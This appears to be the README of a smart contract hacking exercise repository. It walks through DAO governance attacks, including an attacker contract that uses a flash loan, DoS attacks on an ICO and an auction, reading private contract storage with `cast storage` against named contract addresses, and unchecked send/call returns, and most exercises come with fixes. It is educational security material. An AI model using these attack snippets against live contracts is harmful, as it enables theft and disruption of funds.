# Smart Contract Hacking

This is a comprehensive summary of various smart contract hacking techniques and codes, intended to serve as a detailed resource for those interested in understanding and exploiting vulnerabilities within smart contracts. This repository aims to provide an extensive range of examples and in-depth explanations to enhance knowledge and practical skills in the field of blockchain security.

## Setup and Test

### install
```
nvm use 18
yarn
```

### build & test
```
cp .env.sample .env
yarn build
yarn test
```

### test for DOS attacks exercise 1
It takes so long time to test the DOS Attacks Exercise 1 that is located in `test/longer/3-dos-1.ts`. So you should test the exercise only and use 'yarn test:longer'.


## List of Smart Contract Hacking

### DAO Attack
#### Exercise 1
`test/2-dao-attack-1`

##### Hacking Point
```sol
function mint(address _to, uint256 _amount) public onlyOwner {
    _mint(_to, _amount);
    getVotingPower[_to] += _amount;
}
```
This function is a member of DAO contract that inherits from ERC20. This kind of accounting make a hole for vulnerability. Because a malicious voter can have voting power after transferring their deposit fund.

##### Solution
We have to calculate the voting power in transfer-like functions also.

#### Exercise 2
`test/2-dao-attack-2`

##### Hacking Point
An attacker can make his proposal approved because he can transfer his deposit fund to other temporary created wallet and make the wallet vote for him. And he can transfer the fund to the other one. All these actions can make his proposal approved.

##### Solution
We have to consider using the `ERC20Snapshot` for DAO contract

#### Exercise 3
`test/2-dao-attack-3`

##### Hacking Point
An attacker can borrow a flash loan to vote for his malicious proposal with great voting power that he earned the flash loan.
Look at this flash loan code in attacker contract.
```sol
function attack() external {
    require(msg.sender == owner, "not owner");
    IPool(pool).flashLoan(IERC20(token).balanceOf(pool));
}

function callBack(uint borrowAmount) external {
    require(msg.sender == pool, "not pool");

    uint256 investmentId = IGovernance(governance).suggestInvestment(owner, treasury.balance);
    IGovernance(governance).executeInvestment(investmentId);

    IERC20(token).transfer(pool, borrowAmount);
}
```

##### Solution
We have to consider using the `ERC20Snapshot` for DAO contract as in the exercise 2.

### DOS Attack

#### Exercise 1
`test/3-dos-attack-1`

##### Hacking Point
```node
const ATTACKER_INVESTMENT = parseEther('0.000000000001');
for (let i = 0; i < 10000; i++) {
    await tokenSale.connect(attacker).invest({ value: ATTACKER_INVESTMENT });
}
```
If an attacker invest tiny amount of money so many times for ICO. The ICO contract can't distribute its ERC20 token because gas limit exceeds with the following code.
```sol
// investor => [0.0000001, 0.00000001, .....]
for (uint k = 0; k < userInvestments.length; k++) {
    _mint(currentInvestor, userInvestments[k]);
    emit DistributedTokens(currentInvestor, userInvestments[k]);
}
```

#### Exercise 2
`test/3-dos-attack-2`

##### Hacking Point
```node
const attackAuction = await deployContract('AttackAuction', [auction.target], {
    value: currentHighestBid + parseEther('0.00000001')
});
let highestBid = await auction.highestBid();
```
If the `attackAuction` doesn't have any payable function, the following contract function always fails after the attacker bids. So the bid will not work anymore.

```sol
function bid() external payable {
    require(msg.value > highestBid);

    require(currentLeader.send(highestBid));

    currentLeader = payable(msg.sender);
    highestBid = msg.value;
}
```

#### Exercise 3
`test/3-dos-attack-3`

##### Hacking Point
```sol
function flashLoan(uint256 borrowAmount) external nonReentrant {
    // Checks
    require(borrowAmount > 0, "amount should be greater than 0");
    uint256 balanceBefore = shibaToken.balanceOf(address(this));
    require(poolBalance == balanceBefore, "Accounting Issue");
    ...
}
```
This kind of code can make a hole for accounting issue. Because the `poolBalance` can be different from `shibaToken.balanceOf(address(this)`. An attacker can make the code unusable by the following code.
```node
await token.connect(attacker).transfer(pool.target, parseEther('1'));
```

##### Solution
We have to add calculating code in the payable `receive` function.


### Sensitive On-Chain Data

#### Exercise 1
`test/0-sensitive-on-chain-data-1`

##### Hacking Point
```sol
contract SecretDoor is Ownable, ReentrancyGuard {
  bool public isLocked;
  uint8 private doorNumber;
  bytes32 private doorOwnerName;
  bytes32 private secretSpell;
  ...
}
```
The private variables are not really private because the data can be found block explorer or tools like 'cast' if an attacker know the contract address and can guess what storages is used for the private variables.
The following `cast` command is an example.
```shell
cast storage 0x5aF6D33DE2ccEC94efb1bDF8f92Bd58085432d2c 3 --rpc-url https://rpc.ankr.com/bsc
```
`0x5aF6D33DE2ccEC94efb1bDF8f92Bd58085432d2c` is the contract address.
`3` is the storage slot.

##### Solution
To know that private storage variables are never private!

#### Exercise 2
`test/0-sensitive-on-chain-data-2`

##### Hacking Point
```sol
function newRaffle(uint8[3] calldata numbers) external onlyOwner {
    raffleId += 1;
    raffles[raffleId] = numbers;
    isActive = true;
}
```
If you create a contract for an lottery system for users guessing some numbers, the new secret numbers should be set periodically by the owner. But
What if an attacker knows `the contract address` and the `sighash` for the function like `newRaffle`.

The details are following.
```
CMD: cast storage [contract] [slot] --rpc-url https://ethereum-goerli-rpc.allthatnode.com

Slot 0: 0x0000000000000000000000009cc6d4d0d1aac085ff54f254d206d9890f60338c (Owner)
Slot 1: 0x0000000000000000000000000000000000000000000000000000000000000001 (Reentrnacy State Var)
Slot 2: 0x0000000000000000000000000000000000000000000000000000000000000001 (?)
Slot 3: 0x0000000000000000000000000000000000000000000000000000000000000004 (?)

0xc2847b3b - guessNumber sighash
0x3f5a9a5f - newRaffle sighash

Our Block Number: 8660077
Winning TX Block Number: 8660110

Winning transaction:
https://goerli.etherscan.io/tx/0xdb4b3952c434c2c6c0044a5c74e67219f21ecacb8f4ed1bfcd66d97be6cafece

Input data:
0xc2847b3b00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
[Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]

[HEX]  [DEC]
de --> 222
7e --> 126
47 --> 71

Deployed on block: 8655090

newRaffle trnasaciton (from the owner):
https://goerli.etherscan.io/tx/0xdab60e3d7187d9c10b32589a1801d4f6bd0b8830635c5051b9f9f5301fee9f90

Input data:
0x3f5a9a5f00000000000000000000000000000000000000000000000000000000000000de000000000000000000000000000000000000000000000000000000000000007e0000000000000000000000000000000000000000000000000000000000000047
[Sighash / Selector]                                               [Number 1]                                                       [Number 2]                                                   [Number 3]

```

##### Solution
To know that private storage variables are never private again!

### Unchecked Return Attack

#### Exercise 1
`test/5-unchecked-return-1.ts`

##### Hacking Point
1. The low level calls like `send`, `call`, `delegatecall`, and `staticcall` don't revert.
2. If you don't check return value in sending ETHs, you can lose the money.
3. This is the bad pattern.
```
payable(_to).send(_amount);
```
or
```
payable(donation.to).call{value: msg.value}("");
```
##### Solution
```
(bool success, ) = payable(donation.to).call{value: msg.value}("");
require(success, "donation failed, couldn't send ETH");
```

### Call Attack
Will be added soon.

### Front Running
Will be added soon.

### Flash Loan Attack
Will be added soon.

### Oracle Manipulation
Will be added soon.

### Reply Attack
Will be added soon.

### DEFI Money Markets
Will be added soon.